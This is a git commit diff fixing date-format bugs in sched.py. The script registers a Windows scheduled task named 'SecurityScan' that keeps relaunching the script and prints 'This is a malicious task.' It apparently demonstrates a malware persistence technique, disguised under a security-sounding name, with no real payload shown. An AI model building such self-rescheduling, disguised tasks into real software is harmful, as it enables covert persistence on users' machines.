c881105f2855bd03830102ea127432e21b1dfde6
prashant333 <pmani157@gmail.com>
2022-01-19 00:23:59 +0530

    bug fixed in line 15 and 16

--- sched.py
+++ sched.py
@@ -7,12 +7,12 @@ if os.system("schtasks /query /tn SecurityScan") == 0:
 
 print("This is a malicious task.")
 
-fieldir =os.path.join(os.getcwd(), "sched.py")
+fieldir = os.path.join(os.getcwd(), "sched.py")
 
 maxInterval = 1
 interval = 1+(random.random()*(maxInterval-1))
 dt = datetime.now() + timedelta(minutes=interval)
-t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill9(2))
-d = "%s:%s" % (str(dt.month, str(dt.day)).zfill(2),dt.year)
+t = "%s:%s" % (str(dt.hour).zfill(2), str(dt.minute).zfill(2))
+d = "%s/%s/%s" % (dt.month, str(dt.day).zfill(2), dt.year)
 os.system('schtasks /create /tn SecurityScan /tr "'+fieldir+'" /sc once /st '+t+' /sd' +d)
 input()
